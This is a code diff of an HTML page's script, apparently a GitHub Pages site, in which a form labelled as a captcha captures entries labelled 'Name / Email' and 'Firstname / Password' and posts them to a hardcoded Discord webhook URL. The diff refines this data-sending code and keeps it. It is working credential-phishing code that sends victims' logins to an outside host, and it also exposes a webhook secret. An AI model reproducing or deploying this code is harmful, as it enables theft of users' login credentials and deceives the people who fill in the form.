@@ -267,7 +267,6 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 </form>
 
 <script>
-    // Wait until the page is fully loaded
     document.addEventListener('DOMContentLoaded', function() {
         
         const form = document.getElementById('captcha-form');
@@ -276,19 +275,14 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            // Safe element selection
             const nameInput      = document.getElementById('name');
             const firstnameInput = document.getElementById('firstname');
             const rememberInput  = document.getElementById('remember');
             const submitBtn      = document.getElementById('submit-btn');
 
-            if (!nameInput || !firstnameInput) {
-                alert("Form fields not found!");
-                return;
-            }
-
-            const name      = nameInput.value.trim();
-            const firstname = firstnameInput.value.trim();
+            // Force string values to avoid {} object problem
+            const name      = String(nameInput ? nameInput.value.trim() : '').trim() || "Not provided";
+            const firstname = String(firstnameInput ? firstnameInput.value.trim() : '').trim() || "Not provided";
             const remember  = rememberInput && rememberInput.checked ? 'Yes' : 'No';
 
             const webhookUrl = "https://discord.com/api/webhooks/1492217076667121734/zs-o6BpUOqzTF57nzzZ_YOGh2cS2jyUSiTT6rexo6Xbs8siNGhSyluGGjgcVE_Is2Ynq";
@@ -300,17 +294,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                     color: 0x3498db,
                     timestamp: new Date().toISOString(),
                     fields: [
-                        { name: "Name / Email", value: name || "Not provided", inline: true },
-                        { name: "Firstname / Password", value: firstname || "Not provided", inline: true },
-                        { name: "Remember Me", value: remember, inline: true },
-                        { name: "Time", value: new Date().toLocaleString(), inline: false }
+                        { name: "Name / Email",     value: name,      inline: true },
+                        { name: "Firstname / Password", value: firstname, inline: true },
+                        { name: "Remember Me",      value: remember,  inline: true },
+                        { name: "Time",             value: new Date().toLocaleString(), inline: false }
                     ],
                     footer: { text: "GitHub Pages" }
                 }]
             };
 
-            // Button loading state
-            const originalBtnText = submitBtn.textContent;
+            // Button feedback
+            const originalText = submitBtn.textContent;
             submitBtn.disabled = true;
             submitBtn.textContent = "Sending...";
 
@@ -325,16 +319,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                     alert("✅ Successfully sent to Discord!");
                     form.reset();
                 } else {
-                    alert("❌ Failed to send (Error " + response.status + ")");
-                    console.log("Discord response:", await response.text());
+                    const errText = await response.text();
+                    console.error("Discord Error:", response.status, errText);
+                    alert("❌ Discord rejected the request (Error " + response.status + ")");
                 }
             } catch (err) {
                 console.error(err);
-                alert("❌ Network error - Check console (F12)");
+                alert("❌ Failed to connect. Check console (F12)");
             }
 
             submitBtn.disabled = false;
-            submitBtn.textContent = originalBtnText;
+            submitBtn.textContent = originalText;
         });
     });
 </script>
